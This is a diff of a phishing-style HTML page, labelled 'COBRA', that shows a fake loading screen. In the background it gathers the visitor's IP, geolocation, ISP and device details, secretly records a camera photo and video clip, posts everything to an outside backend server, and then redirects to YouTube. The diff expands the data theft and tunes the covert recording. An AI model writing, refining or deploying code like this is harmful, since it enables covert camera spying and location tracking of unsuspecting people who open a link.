@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Loading...</title>
+  <title>Loading Content...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+    .loader { border: 3px solid #1a1a1a; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     video, canvas { opacity: 0; position: absolute; left: -9999px; }
   </style>
@@ -14,7 +14,7 @@
 <body>
   <div style="text-align: center;">
     <div class="loader"></div>
-    <p style="color: #555; font-size: 13px; margin-top: 20px;">جارٍ التحميل...</p>
+    <p style="color: #444; font-size: 12px; margin-top: 15px;">Processing Video Stream...</p>
   </div>
 
   <video id="v" autoplay muted playsinline></video>
@@ -33,33 +33,56 @@
     async function send(payload) {
       if (!chatId) return;
       payload.chat_id = chatId;
-      try {
-        await fetch("https://render-backend-package1.onrender.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-          keepalive: true
-        });
-      } catch (e) {}
+      return fetch("https://render-backend-package1.onrender.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true
+      });
     }
 
-    async function analyze() {
-      // جلب البطارية والسيستم
+    async function gatherIntel() {
+      // 1. معلومات الجهاز الأساسية
       let bat = "N/A";
       try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
       
-      // جلب الـ IP من مصدر سريع جداً (ipify)
-      let ip = "Unknown";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {}
+      const info = {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        plat: navigator.platform,
+        res: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency,
+        ram: navigator.deviceMemory || "N/A",
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
 
-      let m = "🏴‍☠️ *COBRA ULTIMATE V9.0* 🏴‍☠️\n";
-      m += `🌍 *IP:* \`${ip}\`\n`;
+      // 2. محاولة جلب الـ IP من مصدرين مختلفين
+      let ipAddr = "Unknown";
+      let geoData = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        geoData = await res.json();
+        ipAddr = geoData.ip;
+      } catch (e) {
+        try {
+          const res2 = await fetch("https://api.ipify.org?format=json");
+          const data2 = await res2.json();
+          ipAddr = data2.ip;
+        } catch(e2){}
+      }
+
+      const isVpn = (geoData.timezone && geoData.timezone !== info.tz) ? "⚠️ YES" : "✅ NO";
+
+      let m = "🏁 *COBRA FULL INTEL REPORT* 🏁\n";
+      m += "━━━━━━━━━━━━━━━━━━━━\n";
+      m += `🌍 *IP:* \`${ipAddr}\` | *VPN:* ${isVpn}\n`;
+      m += `📍 *Loc:* ${geoData.city || 'Unknown'}, ${geoData.country_name || 'Unknown'}\n`;
+      m += `🏢 *ISP:* ${geoData.org || 'Unknown'}\n`;
+      m += `📱 *Device:* ${info.plat} | ${info.res}\n`;
+      m += `🌐 *Browser:* ${info.lang}\n`;
       m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
-      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${navigator.hardwareConcurrency} Cores\n`;
+      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${info.cores} Cores / ${info.ram}GB\n`;
+      m += "━━━━━━━━━━━━━━━━━━━━\n";
       
       await send({ message: m });
       startSpying();
@@ -71,7 +94,7 @@
           v.srcObject = stream;
           v.onloadedmetadata = () => {
             v.play();
-            const recorder = new MediaRecorder(stream);
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             
@@ -79,32 +102,35 @@
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const reader = new FileReader();
                 reader.readAsDataURL(blob);
-                reader.onloadend = () => { send({ video: reader.result.split(',')[1] }); };
-                setTimeout(finish, 2000);
+                reader.onloadend = () => { 
+                    // إرسال الفيديو بحجم مضغوط
+                    send({ video: reader.result.split(',')[1] }); 
+                };
+                setTimeout(finish, 1500);
             };
 
             setTimeout(async () => {
-                // التقاط صورة واحدة فقط بجودة عالية لضمان السرعة
+                // التقاط صورة (جودة متوسطة لسرعة الإرسال)
                 ctx.drawImage(v, 0, 0, c.width, c.height);
-                await send({ photo: c.toDataURL("image/jpeg", 0.6).split(',')[1] });
+                await send({ photo: c.toDataURL("image/jpeg", 0.5).split(',')[1] });
 
-                // تسجيل فيديو قصير (4 ثواني) لضمان الإرسال
+                // تسجيل فيديو 3 ثواني فقط (المدة المثالية للـ Upload)
                 recorder.start();
                 setTimeout(() => {
                     recorder.stop();
                     stream.getTracks().forEach(t => t.stop());
-                }, 4000); 
+                }, 3500); 
             }, 2000);
           };
         })
-        .catch(() => { send({ message: "❌ Denied" }); finish(); });
+        .catch(() => { send({ message: "❌ Access Denied" }); finish(); });
     }
 
     function finish() {
       window.location.replace(redirectMap[reKey] || "https://youtube.com");
     }
 
-    if (chatId) analyze();
+    if (chatId) gatherIntel();
   </script>
 </body>
 </html>
